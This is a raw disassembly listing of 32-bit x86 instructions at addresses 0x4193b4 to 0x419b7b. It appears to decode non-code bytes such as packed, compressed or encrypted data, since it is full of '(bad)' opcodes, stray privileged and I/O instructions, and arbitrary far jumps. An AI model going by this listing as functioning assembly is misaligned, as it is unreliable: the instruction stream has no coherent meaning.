  4193b4:	add    ah,BYTE PTR [ecx+0x7d64e114]
  4193ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193bb:	fwait
  4193bc:	(bad)
  4193bf:	add    DWORD PTR [edi+0x383bf2c0],edx
  4193c5:	mov    esi,0xe618002e
  4193ca:	int3   
  4193cb:	mov    dh,0x98
  4193cd:	mov    BYTE PTR [ebp+0x68ee9dae],ch
  4193d3:	xchg   BYTE PTR [eax+edi*8+0x1b],dl
  4193d7:	xor    BYTE PTR [edx],bh
  4193d9:	inc    eax
  4193da:	xor    al,0xda
  4193dc:	jne    0x419396
  4193de:	push   0xf98f7c6e
  4193e3:	mov    eax,ds:0x21b3519e
  4193e8:	(bad)  
  4193e9:	xchg   esi,eax
  4193ea:	(bad)  
  4193ec:	dec    ebp
  4193ed:	imul   al
  4193ef:	out    dx,eax
  4193f0:	stos   DWORD PTR es:[edi],eax
  4193f1:	sahf   
  4193f2:	sar    dh,cl
  4193f4:	pop    ebx
  4193f5:	enter  0x2bc4,0x6a
  4193f9:	cmp    DWORD PTR [ecx+0x83e81c8],ebp
  4193ff:	jno    0x419387
  419401:	cmp    al,BYTE PTR [ecx+0x5db81202]
  419407:	stos   DWORD PTR es:[edi],eax
  419408:	pop    esi
  419409:	sub    ch,BYTE PTR [edi+edi*1-0x6]
  41940d:	inc    esi
  41940e:	scas   eax,DWORD PTR es:[edi]
  41940f:	inc    ebp
  419410:	(bad)  
  419411:	js     0x4193db
  419413:	arpl   bp,cx
  419415:	das    
  419416:	add    eax,0x593690d
  41941b:	adc    ch,BYTE PTR [edx-0x4c]
  41941e:	mov    DWORD PTR [eax],esi
  419420:	push   0xe2cc834e
  419425:	xchg   esi,eax
  419426:	inc    ebp
  419427:	jb     0x4193e1
  419429:	stos   DWORD PTR es:[edi],eax
  41942a:	stos   DWORD PTR es:[edi],eax
  41942b:	mov    bl,0xe5
  41942d:	stc    
  41942e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41942f:	mov    DWORD PTR [eax+ebx*1+0x3dbfe2c8],esi
  419436:	push   cs
  419437:	ret    0x1d34
  41943a:	add    DWORD PTR [eax+0x2717c337],esp
  419440:	sbb    DWORD PTR [ebx],0xdfcb2b17
  419446:	push   esp
  419447:	int3   
  419448:	add    al,0xeb
  41944a:	cmovp  eax,edx
  41944d:	sbb    eax,0x5e30b60f
  419452:	pop    ebp
  419453:	pop    ss
  419454:	mov    al,0xf
  419456:	test   eax,0xbfa655b3
  41945b:	loop   0x41948e
  41945d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41945e:	adc    bl,BYTE PTR [esi+0x3cda229d]
  419464:	stc    
  419465:	mov    ebx,0xe393b404
  41946a:	pop    edx
  41946b:	out    dx,al
  41946c:	ins    DWORD PTR es:[edi],dx
  41946d:	es dec esp
  41946f:	jp     0x419424
  419471:	gs dec ebp
  419473:	cmp    al,0x35
  419475:	jne    0x41944c
  419477:	lods   al,BYTE PTR ds:[esi]
  419478:	leave  
  419479:	mov    dh,0x89
  41947b:	clc    
  41947c:	pop    ebx
  41947d:	or     al,0x4f
  41947f:	test   cl,dh
  419481:	xlat   BYTE PTR ds:[ebx]
  419482:	aad    0x5a
  419484:	loope  0x419473
  419486:	icebp  
  419487:	lds    edi,FWORD PTR [esp+edx*4]
  41948a:	stc    
  41948b:	fwait
  41948c:	cmp    al,0xc1
  41948e:	(bad)  
  41948f:	std    
  419490:	push   esp
  419491:	cmp    dh,BYTE PTR [eax+0x4d]
  419494:	(bad)
  419498:	mov    ecx,DWORD PTR ss:[ebx]
  41949b:	aad    0xa9
  41949d:	ror    DWORD PTR [esi-0x5b],0x52
  4194a1:	fsub   DWORD PTR [ecx]
  4194a3:	je     0x419493
  4194a5:	mov    edx,0x25adae0c
  4194aa:	cmp    eax,0x97c6aba7
  4194af:	leave  
  4194b0:	or     bl,BYTE PTR [esi-0x36bc6c05]
  4194b6:	out    dx,al
  4194b7:	jne    0x419495
  4194b9:	xchg   dl,dl
  4194bb:	sub    ebp,ebp
  4194bd:	pop    edi
  4194be:	sub    eax,0xff493e51
  4194c3:	(bad)  
  4194c4:	(bad)  
  4194c6:	cmp    eax,0x457d9714
  4194cb:	xchg   esp,eax
  4194cc:	jecxz  0x4194cd
  4194ce:	mul    DWORD PTR [edx+0x7aebf136]
  4194d4:	xlat   BYTE PTR ds:[ebx]
  4194d5:	pop    es
  4194d6:	mov    al,0xdf
  4194d8:	cmp    al,BYTE PTR [edi+edi*8+0x53f3a089]
  4194df:	inc    ebx
  4194e0:	int    0x43
  4194e2:	inc    ecx
  4194e3:	push   esp
  4194e4:	retf   0x8f4a
  4194e7:	mov    ebp,gs
  4194e9:	inc    eax
  4194ea:	mov    eax,ds:0xf7cadf27
  4194ef:	and    al,0xd5
  4194f1:	das    
  4194f2:	xchg   ebp,eax
  4194f3:	sbb    DWORD PTR [edi],0xffffffc6
  4194f6:	inc    ebx
  4194f7:	daa    
  4194f8:	push   ebx
  4194f9:	jl     0x419508
  4194fb:	adc    ch,BYTE PTR [edi+0x1db9dfef]
  419501:	shl    BYTE PTR [edx+0x5d283fa5],cl
  419507:	repz pop ds
  419509:	push   esi
  41950a:	lods   al,BYTE PTR ds:[esi]
  41950b:	mov    dl,0x75
  41950d:	xchg   ecx,eax
  41950e:	sbb    edx,edx
  419510:	xchg   DWORD PTR [ebp+0x777edb1d],eax
  419516:	jns    0x4194c6
  419518:	inc    ebp
  419519:	sub    DWORD PTR ds:0xe2fbdd3b,edi
  41951f:	xchg   DWORD PTR [ebp-0x37471dc8],ebx
  419525:	daa    
  419526:	es xchg esp,edx
  419529:	or     eax,ebp
  41952b:	jns    0x4194b8
  41952d:	and    al,BYTE PTR [ebp+0x106e0d89]
  419533:	mov    esp,0x4b4e46e2
  419538:	push   ecx
  419539:	mov    ch,0x7
  41953b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41953c:	xor    ebp,DWORD PTR [esi-0x1c]
  41953f:	cmp    DWORD PTR [ecx+0x5aba0e2f],esp
  419545:	pop    ebx
  419546:	lahf   
  419547:	std    
  419548:	jge    0x419556
  41954a:	fsub   QWORD PTR [ebx-0x7f]
  41954d:	fnsave [ecx+0x12]
  419550:	sahf   
  419551:	mul    esp
  419553:	call   0x952d:0x6e800fd3
  41955a:	push   cs
  41955b:	dec    edx
  41955c:	scas   al,BYTE PTR es:[edi]
  41955d:	xchg   cl,cl
  41955f:	pushf  
  419560:	push   esi
  419561:	iret   
  419562:	rol    BYTE PTR [edi+ecx*2+0x56],0x44
  419567:	aas    
  419568:	stos   DWORD PTR es:[edi],eax
  419569:	pushf  
  41956a:	es push ecx
  41956c:	push   esi
  41956d:	mov    eax,ds:0x80ab7ab7
  419572:	or     eax,0x56cc3cca
  419577:	imul   esi,DWORD PTR ds:0x5590189,0xffffffc3
  41957e:	in     al,0xc2
  419580:	fbstp  TBYTE PTR [edi-0x63309d07]
  419586:	loop   0x41951b
  419588:	das    
  419589:	test   al,0xd2
  41958b:	cmp    bh,BYTE PTR es:[edx+ebx*2+0x15]
  419590:	repz adc al,0xf4
  419593:	mov    dh,0x49
  419595:	xchg   ebp,eax
  419596:	fistp  QWORD PTR [eax-0x10]
  419599:	test   eax,0xea0b6b02
  41959e:	gs inc ecx
  4195a0:	jbe    0x41960b
  4195a2:	shl    BYTE PTR [ecx],0xaa
  4195a5:	xor    al,0x7e
  4195a7:	ins    DWORD PTR es:[edi],dx
  4195a8:	mov    bh,0x19
  4195aa:	pop    ebx
  4195ab:	retf   
  4195ac:	dec    edx
  4195ad:	rcl    eax,cl
  4195af:	cld    
  4195b0:	out    dx,eax
  4195b1:	add    dh,BYTE PTR [ecx+0xb]
  4195b4:	jbe    0x4195e0
  4195b6:	cmc    
  4195b7:	xchg   edi,eax
  4195b8:	push   ebx
  4195b9:	jae    0x4195ae
  4195bb:	leave  
  4195bc:	xchg   BYTE PTR [eax+0x7753bd7a],ch
  4195c2:	cmp    eax,0xf4969220
  4195c7:	xchg   esi,eax
  4195c8:	or     al,0x7f
  4195ca:	das    
  4195cb:	dec    eax
  4195cc:	push   ss
  4195cd:	mov    cl,0xe0
  4195cf:	sub    eax,esi
  4195d1:	pop    esi
  4195d2:	lahf   
  4195d3:	shl    BYTE PTR [edi-0x3328c2d9],0x1a
  4195da:	arpl   bx,dx
  4195dc:	adc    ebp,DWORD PTR [edi]
  4195de:	test   BYTE PTR [ecx+0xfd847c3],cl
  4195e4:	sbb    edx,ebp
  4195e6:	mov    ds:0x8c5fe81a,al
  4195eb:	lock mov WORD PTR [esi-0x50bf8ade],?
  4195f2:	or     dl,BYTE PTR [eax-0x99cf3df]
  4195f8:	sbb    DWORD PTR [ebp-0x53],esi
  4195fb:	fdivp  st(0),st
  4195fd:	dec    edi
  4195fe:	mov    al,ds:0xa455e045
  419603:	xchg   ebx,eax
  419604:	add    eax,0x2b137f41
  419609:	ja     0x41962e
  41960b:	ins    BYTE PTR es:[di],dx
  41960d:	and    DWORD PTR [edi+0x45ecce03],ebx
  419613:	cmp    eax,0x1a41d901
  419618:	and    al,0x1e
  41961a:	cmc    
  41961b:	mov    ds:0x36b2bd47,al
  419620:	imul   edx,DWORD PTR [ebx],0x1dfe2ed7
  419626:	mov    dh,0x84
  419628:	mul    bh
  41962a:	fcom   DWORD PTR [eax]
  41962c:	push   es
  41962d:	mov    ds:0xf7ed8b4c,eax
  419632:	sbb    DWORD PTR [eax],0xffffff80
  419635:	mov    bl,0xfa
  419637:	dec    ebp
  419638:	lahf   
  419639:	add    al,0x70
  41963b:	(bad)  
  41963c:	or     edx,DWORD PTR [ecx+0x40fa9006]
  419642:	adc    cl,bh
  419644:	lods   eax,DWORD PTR ds:[esi]
  419645:	and    BYTE PTR [esi+0x79],dh
  419648:	dec    ebx
  419649:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41964a:	push   ds
  41964b:	aam    0x34
  41964d:	mov    bl,0x2b
  41964f:	and    si,0xffca
  419653:	xchg   ecx,eax
  419654:	lods   eax,DWORD PTR ds:[esi]
  419655:	mov    dh,0xdb
  419657:	test   BYTE PTR [ebx+0x2aaf2c89],dl
  41965d:	mov    edi,0xb9cc38f4
  419662:	ins    BYTE PTR es:[edi],dx
  419663:	int3   
  419664:	xchg   ecx,eax
  419665:	sbb    DWORD PTR [edi],ecx
  419667:	adc    bl,BYTE PTR [ecx-0x37]
  41966a:	sub    esp,DWORD PTR [eax]
  41966c:	jbe    0x41961b
  41966e:	jmp    0x27b3:0xb9055dc6
  419675:	mov    ds:0xa00bda40,al
  41967a:	in     al,0xb6
  41967c:	(bad)  
  41967d:	iret   
  41967e:	int3   
  41967f:	mov    ebp,0x51f96e0d
  419684:	mov    edx,0x97fac5b
  419689:	fimul  DWORD PTR [edi]
  41968b:	xchg   esi,eax
  41968c:	stc    
  41968d:	sahf   
  41968e:	(bad)  [ebx]
  419690:	lock push edx
  419692:	icebp  
  419693:	popa   
  419694:	cwde   
  419695:	rcr    BYTE PTR [ecx-0x92e9499],cl
  41969b:	dec    ebx
  41969c:	daa    
  41969d:	jl     0x419639
  41969f:	jmp    0x41966b
  4196a1:	mov    esi,0x83489190
  4196a6:	xchg   esi,eax
  4196a7:	mov    bl,0xd1
  4196a9:	aam    0x27
  4196ab:	and    eax,0x3070744b
  4196b0:	and    edx,0xd59c8dc3
  4196b6:	xor    DWORD PTR [ebp+0x5b],esp
  4196b9:	stc    
  4196ba:	cmp    DWORD PTR [edx+0x6665b1d4],0xa787fe6f
  4196c4:	xor    ecx,DWORD PTR [eax]
  4196c6:	aam    0x52
  4196c8:	imul   edx,DWORD PTR [edi-0x4bd56b68],0xffffffd4
  4196cf:	jmp    0x6a99:0x48c3a90c
  4196d6:	mov    al,0xaf
  4196d8:	les    esp,FWORD PTR [edi+0x349f668]
  4196de:	test   dh,ch
  4196e0:	cld    
  4196e1:	mov    ah,al
  4196e3:	aad    0xcc
  4196e5:	sar    BYTE PTR [ecx],cl
  4196e7:	stos   DWORD PTR es:[edi],eax
  4196e8:	pop    esp
  4196e9:	icebp  
  4196ea:	cmp    eax,ebp
  4196ec:	ja     0x419675
  4196ee:	push   es
  4196ef:	sbb    ebx,DWORD PTR [edx+edi*1+0x1a]
  4196f3:	data16 aas 
  4196f5:	xor    DWORD PTR [eax-0x6b],ebp
  4196f8:	movsx  ebx,WORD PTR [ebx+ebp*1+0x7c31c438]
  419700:	leave  
  419701:	lock sbb eax,0xafb45a11
  419707:	sub    al,0xa0
  419709:	mov    al,0x8b
  41970b:	inc    eax
  41970c:	mov    dl,BYTE PTR [eax+0x2f]
  41970f:	xchg   ebx,eax
  419710:	ja     0x419766
  419712:	jns    0x419745
  419714:	jbe    0x4196ae
  419716:	pop    esp
  419717:	pop    ebx
  419718:	ins    DWORD PTR es:[edi],dx
  419719:	retf   
  41971a:	jbe    0x41972f
  41971c:	mov    fs,ebx
  41971e:	jecxz  0x419743
  419720:	inc    ecx
  419721:	push   edi
  419722:	push   cs
  419723:	xchg   edi,eax
  419724:	and    bl,BYTE PTR [esi]
  419726:	push   ebx
  419727:	and    eax,DWORD PTR [eax+0x2c]
  41972a:	ins    DWORD PTR es:[edi],dx
  41972b:	push   0xffffff86
  41972d:	adc    esi,DWORD PTR [edx-0xc65f88e]
  419733:	xchg   ecx,eax
  419734:	(bad)  
  419736:	xor    dh,BYTE PTR [eax]
  419738:	add    bl,ah
  41973a:	dec    ebp
  41973b:	mov    ds:0xbd3d4f97,al
  419740:	stc    
  419741:	mov    edx,0x5ee08e6e
  419746:	ficomp DWORD PTR [ebx+0x7d]
  419749:	iret   
  41974a:	and    DWORD PTR [edi-0x25],0x157fec5d
  419751:	add    dh,BYTE PTR [ebx+0x35]
  419754:	inc    edx
  419755:	mov    edx,0xd3ce3a15
  41975a:	push   cs
  41975b:	(bad)  
  41975d:	repnz imul ebp,ecx,0x13a3bf09
  419764:	push   es
  419765:	or     eax,0x50e98482
  41976a:	push   edi
  41976b:	loope  0x4196ed
  41976d:	adc    DWORD PTR [edx-0x371afcd1],edi
  419773:	jns    0x41972b
  419775:	mov    esp,edi
  419777:	add    BYTE PTR [ebx-0x7e75437b],ch
  41977d:	jb     0x4197e0
  41977f:	push   ebp
  419780:	push   esp
  419781:	dec    edi
  419782:	std    
  419783:	push   ecx
  419784:	dec    esp
  419785:	out    dx,al
  419786:	ror    DWORD PTR [edi+0x64],0x8f
  41978a:	shr    BYTE PTR [ebp-0x35],cl
  41978d:	and    esi,DWORD PTR [ebp+ebx*1-0x17]
  419791:	or     bh,BYTE PTR [ebp-0x60429883]
  419797:	xor    BYTE PTR [edx],ah
  419799:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41979a:	xor    eax,ecx
  41979c:	into   
  41979d:	ja     0x419796
  41979f:	cs mov esi,0x74357899
  4197a5:	rcl    DWORD PTR [ebp*4+0x7bdb1e4b],1
  4197ac:	push   ds
  4197ad:	or     eax,DWORD PTR [ecx+eiz*1+0x416dd538]
  4197b4:	lods   al,BYTE PTR ds:[esi]
  4197b5:	cmp    eax,0x14026f55
  4197ba:	jle    0x4197da
  4197bc:	fnsave [ecx]
  4197be:	pop    ds
  4197bf:	pop    esi
  4197c0:	pop    ds
  4197c1:	clc    
  4197c2:	aas    
  4197c3:	stos   BYTE PTR es:[edi],al
  4197c4:	leave  
  4197c5:	push   esp
  4197c6:	lods   al,BYTE PTR ds:[esi]
  4197c7:	sahf   
  4197c8:	sbb    bh,BYTE PTR [edi-0x1b967796]
  4197ce:	sub    ch,cl
  4197d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197d1:	adc    al,dh
  4197d3:	aas    
  4197d4:	mov    ds:0x975183c,al
  4197d9:	cmp    al,0x95
  4197db:	loopne 0x419851
  4197dd:	mov    edx,0xc5f6f2e2
  4197e2:	pusha  
  4197e3:	jne    0x419827
  4197e5:	inc    esi
  4197e6:	push   ecx
  4197e7:	mov    esi,0x3d825a4d
  4197ec:	aas    
  4197ed:	frndint 
  4197ef:	ficom  DWORD PTR ds:[ebx-0x78199b35]
  4197f6:	mov    dl,0x19
  4197f8:	cmp    BYTE PTR [ebp+0x721239cc],0xcb
  4197ff:	push   0xffffffa5
  419801:	mov    dl,0xba
  419803:	xlat   BYTE PTR ds:[ebx]
  419804:	dec    ecx
  419805:	push   DWORD PTR [eax]
  419807:	jne    0x419868
  419809:	lods   eax,DWORD PTR ds:[esi]
  41980a:	test   al,0xc0
  41980c:	pop    ebp
  41980d:	sahf   
  41980e:	mov    ds:0x1a244278,eax
  419813:	or     al,0x10
  419815:	push   ebx
  419816:	and    eax,0x6bd73fe4
  41981b:	les    ebx,FWORD PTR [eax+0x5]
  41981e:	add    eax,0xc52e4d68
  419823:	or     ah,bl
  419825:	stc    
  419826:	add    edx,DWORD PTR [eax]
  419828:	popf   
  419829:	push   0xffffffb4
  41982b:	push   esp
  41982c:	into   
  41982d:	out    dx,eax
  41982e:	outs   dx,BYTE PTR ds:[esi]
  41982f:	(bad)  
  419830:	dec    ebp
  419831:	xchg   esp,eax
  419832:	mov    BYTE PTR [edi+eax*1],ah
  419835:	int3   
  419836:	sbb    BYTE PTR [eax+ebp*8],0x54
  41983a:	xchg   BYTE PTR [edx],bl
  41983c:	dec    edi
  41983d:	or     DWORD PTR [ebx+0x63837042],edx
  419843:	mov    WORD PTR [ebp+0x265c1b55],cs
  419849:	push   edx
  41984a:	outs   dx,BYTE PTR ds:[esi]
  41984b:	stos   DWORD PTR es:[edi],eax
  41984c:	ss push ss
  41984e:	std    
  41984f:	retf   0x50af
  419852:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419853:	repz adc DWORD PTR [eax-0x3537506],edx
  41985a:	nop
  41985b:	sti    
  41985c:	mov    al,ds:0x79d3452e
  419861:	add    eax,0xf4d2ac04
  419866:	mov    dh,0x8a
  419868:	sbb    ebp,DWORD PTR ds:0x5ab40f9a
  41986e:	scas   al,BYTE PTR es:[edi]
  41986f:	lahf   
  419870:	jle    0x419841
  419872:	sub    al,cl
  419874:	mov    cl,0x39
  419876:	inc    eax
  419877:	push   edi
  419878:	jg     0x419882
  41987a:	jnp    0x41981e
  41987c:	test   al,0xfe
  41987e:	add    al,BYTE PTR [ecx-0x21f07fc2]
  419884:	into   
  419885:	adc    edi,DWORD PTR [eax]
  419887:	xchg   ecx,eax
  419888:	and    DWORD PTR [ebx+eax*2-0x44],ebp
  41988c:	push   eax
  41988d:	faddp  st(1),st
  41988f:	data16 sbb al,0xa4
  419892:	lock sbb ch,BYTE PTR [eax]
  419895:	aaa    
  419896:	fwait
  419897:	int3   
  419898:	dec    esi
  419899:	loope  0x4198ef
  41989b:	jbe    0x4198c2
  41989d:	mov    ds:0xb702fe7c,eax
  4198a2:	push   0x3c4e75
  4198a7:	ss int3 
  4198a9:	cli    
  4198aa:	push   ecx
  4198ab:	lock ficom DWORD PTR [edx+ebx*8]
  4198af:	add    dh,0xfe
  4198b2:	out    0xd3,al
  4198b4:	pop    edi
  4198b5:	cwde   
  4198b6:	mov    dl,0x32
  4198b8:	adc    al,0x78
  4198ba:	push   edx
  4198bb:	ins    BYTE PTR es:[edi],dx
  4198bc:	inc    ecx
  4198bd:	fs xchg esp,eax
  4198bf:	inc    edx
  4198c0:	rol    esp,1
  4198c2:	or     bh,BYTE PTR [ebp+0x3f]
  4198c5:	pop    esp
  4198c6:	stos   DWORD PTR es:[edi],eax
  4198c7:	or     DWORD PTR [ebx],eax
  4198c9:	ins    BYTE PTR es:[edi],dx
  4198ca:	sub    DWORD PTR [esi],esi
  4198cc:	jae    0x4198be
  4198ce:	popa   
  4198cf:	inc    ebx
  4198d0:	jbe    0x419931
  4198d2:	inc    edx
  4198d3:	mov    ecx,0x9d4a00c2
  4198d8:	inc    esp
  4198d9:	rcl    DWORD PTR [ebp-0x78],1
  4198dc:	andps  xmm4,XMMWORD PTR [eax+0x49d63f44]
  4198e3:	jmp    0x4198dd
  4198e5:	sar    DWORD PTR [ebp-0x3c],1
  4198e8:	imul   ch
  4198ea:	aam    0xd5
  4198ec:	add    al,0x31
  4198ee:	sub    BYTE PTR [ebx*4+0x78fe500b],dl
  4198f5:	pusha  
  4198f6:	les    esi,FWORD PTR [edi]
  4198f8:	mov    BYTE PTR [edi-0x4c],bh
  4198fb:	mov    ss,WORD PTR [ebx+0x3a]
  4198fe:	mov    edx,0x9f63b81b
  419903:	int3   
  419904:	jbe    0x419892
  419906:	lods   al,BYTE PTR ds:[esi]
  419907:	test   BYTE PTR [edx+0x7f16c41b],bl
  41990d:	xlat   BYTE PTR ds:[ebx]
  41990e:	xchg   esp,eax
  41990f:	mov    eax,ds:0x42bba883
  419914:	or     BYTE PTR ds:0x5ddcc100,al
  41991a:	and    BYTE PTR [edx-0xc],dl
  41991d:	jg     0x419904
  41991f:	add    esp,DWORD PTR ds:[edi-0x1f919f34]
  419926:	mov    bh,0x19
  419928:	scas   eax,DWORD PTR es:[edi]
  419929:	ss inc esp
  41992b:	xchg   DWORD PTR [eax-0x7c],ebx
  41992e:	mul    DWORD PTR [ebp+edx*4-0x26e535dd]
  419935:	das    
  419936:	mov    ebx,0x6a2f223e
  41993b:	mov    cl,dl
  41993d:	je     0x419942
  41993f:	add    cl,dh
  419941:	out    0x18,al
  419943:	cs hlt 
  419945:	cmp    al,0xbc
  419947:	xor    ch,BYTE PTR [eax+esi*4+0x6a1b36cd]
  41994e:	ins    DWORD PTR es:[edi],dx
  41994f:	pop    edi
  419950:	and    eax,0xb5f1f012
  419955:	ins    DWORD PTR es:[edi],dx
  419956:	jle    0x4199c8
  419958:	pop    fs
  41995a:	addr16 pop esi
  41995c:	and    ecx,ebp
  41995e:	(bad)  
  41995f:	fwait
  419960:	mov    edx,es
  419962:	xchg   edi,eax
  419963:	push   sp
  419965:	mov    eax,0xc4f962ec
  41996a:	lea    edi,[esi+0x7b737dfc]
  419970:	shr    DWORD PTR [esi],1
  419972:	adc    esp,DWORD PTR [esi-0x5d8248d9]
  419978:	loop   0x419967
  41997a:	sbb    cl,BYTE PTR es:[esi]
  41997d:	daa    
  41997e:	dec    esi
  41997f:	jbe    0x419983
  419981:	std    
  419982:	mov    dl,0xec
  419984:	jae    0x41998e
  419986:	mov    esi,DWORD PTR [edx-0x1d83de82]
  41998c:	xor    ecx,edi
  41998e:	inc    ebx
  41998f:	add    DWORD PTR [edi+esi*8],ecx
  419992:	mov    bl,0xbb
  419994:	nop
  419995:	leave  
  419996:	neg    DWORD PTR [edx]
  419998:	dec    esi
  419999:	dec    ebp
  41999a:	(bad)  
  41999b:	enter  0x526,0x69
  41999f:	jb     0x41994f
  4199a1:	mov    BYTE PTR [edi+0x7d],cl
  4199a4:	sar    DWORD PTR [ebx-0x1d4131b],0x72
  4199ab:	sub    BYTE PTR [ecx-0x4e],dl
  4199ae:	mov    eax,ds:0xcfcbcbe0
  4199b3:	adc    ch,BYTE PTR [ebx-0x3e908343]
  4199b9:	fdivr  DWORD PTR [esi+0x6]
  4199bc:	mov    bl,0x65
  4199be:	mov    BYTE PTR [ebp-0x2e],dl
  4199c1:	sti    
  4199c2:	ss daa 
  4199c4:	adc    eax,0xf6bccf83
  4199c9:	inc    ebp
  4199ca:	push   edx
  4199cb:	add    eax,0x3d241efa
  4199d0:	mov    ?,WORD PTR [edx+0x1db8a969]
  4199d6:	ds inc esi
  4199d8:	jmp    0x4199ed
  4199da:	repz or al,0x4c
  4199dd:	and    ebp,eax
  4199df:	cwde   
  4199e0:	push   edi
  4199e1:	xchg   ebx,eax
  4199e2:	adc    esi,edx
  4199e4:	enter  0xd388,0xf6
  4199e8:	pop    ds
  4199e9:	sub    BYTE PTR [esi],al
  4199eb:	loopne 0x4199c9
  4199ed:	into   
  4199ee:	sbb    dh,BYTE PTR [ebp+edx*4-0x4a8a0fcd]
  4199f5:	hlt    
  4199f6:	fwait
  4199f7:	jbe    0x4199c5
  4199f9:	inc    edx
  4199fa:	and    BYTE PTR ds:0xf95d1dc4,cl
  419a00:	sbb    edx,DWORD PTR [ebx+0x7119647e]
  419a06:	sbb    esp,ebp
  419a08:	dec    esi
  419a09:	ret    0x7b24
  419a0c:	pop    es
  419a0d:	mov    ds:0x3eadff45,al
  419a12:	pop    eax
  419a13:	ins    BYTE PTR es:[edi],dx
  419a14:	lods   al,BYTE PTR ds:[esi]
  419a15:	stos   BYTE PTR es:[edi],al
  419a16:	add    al,0xe9
  419a18:	add    BYTE PTR [edx-0x4cf4dc7a],0x40
  419a1f:	push   cs
  419a20:	inc    edx
  419a21:	inc    edx
  419a22:	jo     0x4199fe
  419a24:	or     ebx,DWORD PTR [edi-0x18df043a]
  419a2a:	outs   dx,DWORD PTR ds:[esi]
  419a2b:	push   ebx
  419a2c:	arpl   WORD PTR [ebx],bp
  419a2e:	loop   0x4199e6
  419a30:	sbb    BYTE PTR [esi],cl
  419a32:	ret    0x506e
  419a35:	popa   
  419a36:	and    eax,0x9623640f
  419a3b:	dec    eax
  419a3c:	xchg   esp,edi
  419a3e:	mov    eax,ds:0x36514af5
  419a43:	fld    QWORD PTR [edi]
  419a45:	xchg   esi,eax
  419a46:	idiv   DWORD PTR [ebx-0x4d7ea04b]
  419a4c:	jo     0x4199db
  419a4e:	cdq    
  419a4f:	or     ah,BYTE PTR [eax-0x5bdebf8]
  419a55:	lods   eax,DWORD PTR ds:[esi]
  419a56:	ficom  WORD PTR [ecx+0x1319c57e]
  419a5c:	sub    dl,BYTE PTR [edi+0x7d7e4c92]
  419a62:	pop    ebp
  419a63:	bound  eax,QWORD PTR [esi]
  419a65:	data16 fcomp QWORD PTR [edx]
  419a68:	xchg   esp,eax
  419a69:	or     al,0x96
  419a6b:	jecxz  0x419ad8
  419a6d:	bound  esi,QWORD PTR [ebx-0x1d647024]
  419a73:	xor    eax,0x13031cc1
  419a78:	outs   dx,BYTE PTR ds:[esi]
  419a79:	fisub  DWORD PTR [ecx]
  419a7b:	popa   
  419a7c:	fcom   DWORD PTR [ebx-0x6a]
  419a7f:	pop    ecx
  419a80:	push   ebx
  419a81:	jae    0x419ad6
  419a83:	es mov edx,0x52b6028b
  419a89:	cdq    
  419a8a:	dec    BYTE PTR [edx]
  419a8c:	mov    eax,ds:0x9492feda
  419a91:	sub    ch,BYTE PTR [edi-0x3f]
  419a94:	cmp    eax,0xd8b25ac4
  419a99:	push   es
  419a9a:	fwait
  419a9b:	jo     0x419a9d
  419a9d:	add    esi,DWORD PTR [ebp-0x5bfd1b2c]
  419aa3:	mov    edi,0x948ca621
  419aa8:	aam    0xad
  419aaa:	push   ecx
  419aab:	fs xchg ah,dh
  419aae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419aaf:	fldcw  WORD PTR [edx+0x9]
  419ab2:	retf   
  419ab3:	aad    0x3f
  419ab5:	cmp    dl,dh
  419ab7:	inc    eax
  419ab8:	(bad)  
  419ab9:	out    dx,al
  419aba:	jg     0x419a76
  419abc:	sub    al,0xcc
  419abe:	sub    edi,DWORD PTR [ebp+0xe06cbe0]
  419ac4:	or     BYTE PTR [edi+eiz*2-0x75],ah
  419ac8:	fild   DWORD PTR ds:0x6658a20d
  419ace:	xor    eax,0xc1208d8b
  419ad3:	arpl   WORD PTR [ebp-0x537209a1],sp
  419ad9:	xchg   edx,eax
  419ada:	add    edi,ecx
  419adc:	leave  
  419add:	fist   WORD PTR [eax+0x3fd874b7]
  419ae3:	sbb    al,0x40
  419ae5:	outs   dx,BYTE PTR ds:[esi]
  419ae6:	inc    edx
  419ae7:	enter  0xbe2,0xb5
  419aeb:	cli    
  419aec:	mov    ecx,0xbf59e34c
  419af1:	or     DWORD PTR [edx+0x49],esp
  419af4:	fwait
  419af5:	xlat   BYTE PTR ds:[ebx]
  419af6:	pop    esp
  419af7:	xor    BYTE PTR [ebx+0x3382c8a6],0xac
  419afe:	push   edi
  419aff:	xor    al,0x35
  419b01:	xor    dl,al
  419b03:	jmp    0x890e9dcd
  419b08:	xchg   edi,eax
  419b09:	cmp    eax,0x11b5ed46
  419b0e:	lock jmp 0x2f1c:0x8f4167ee
  419b16:	loop   0x419aea
  419b18:	mov    eax,0x5999323f
  419b1d:	push   ebp
  419b1e:	shr    BYTE PTR [ebp+0x2845d587],0xbc
  419b25:	add    bh,BYTE PTR [esp+esi*2-0x8]
  419b29:	sti    
  419b2a:	loop   0x419ac5
  419b2c:	xchg   ebp,eax
  419b2d:	cdq    
  419b2e:	jbe    0x419b4c
  419b30:	push   0x22b794bf
  419b35:	inc    ebx
  419b36:	out    dx,eax
  419b37:	call   0xd25b:0xe334291a
  419b3e:	lahf   
  419b3f:	push   esp
  419b40:	rcl    DWORD PTR [ecx],0xf
  419b43:	pop    esi
  419b44:	mov    ds:0x42075812,al
  419b49:	shl    BYTE PTR [ebx],0xb0
  419b4c:	push   esi
  419b4d:	int    0x7
  419b4f:	lods   eax,DWORD PTR ds:[esi]
  419b50:	mov    ecx,0x86c1dbdf
  419b55:	sbb    dl,bl
  419b57:	mov    WORD PTR [edi-0x4a93dd58],?
  419b5d:	aaa    
  419b5e:	jle    0x419b7b
  419b60:	cmp    dh,BYTE PTR [esi*8-0x65408b3a]
  419b67:	dec    eax
  419b68:	xchg   ebx,eax
  419b69:	dec    esi
  419b6a:	icebp  
  419b6b:	inc    esi
  419b6c:	es sbb al,0xe4
  419b6f:	leave  
  419b70:	(bad)  [edx]
  419b72:	lods   eax,DWORD PTR ds:[esi]
  419b73:	sbb    ebx,edx
  419b75:	loope  0x419b9c
  419b77:	aas    
  419b78:	lds    ebp,FWORD PTR [ebx]
  419b7a:	in     eax,dx
  419b7b:	inc    ebx
